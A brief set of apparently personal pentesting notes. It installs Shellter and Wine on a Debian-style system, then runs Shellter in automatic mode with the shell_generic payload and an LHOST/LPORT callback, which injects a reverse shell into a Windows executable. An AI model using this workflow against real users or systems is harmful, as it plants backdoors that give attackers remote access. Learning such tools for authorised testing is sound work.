#Install shelter:

sudo apt install shellter; sudo apt install wine; sudo dpkg --add-architecture i386 && sudo apt-get update -y && sudo apt-get install wine32 -y

#Open shellter with sudo:

sudo shellter

#Once in the Shellter Interface: Automatic mode (A), Listed payloads (shell_generic), set LHOST and LPORT.
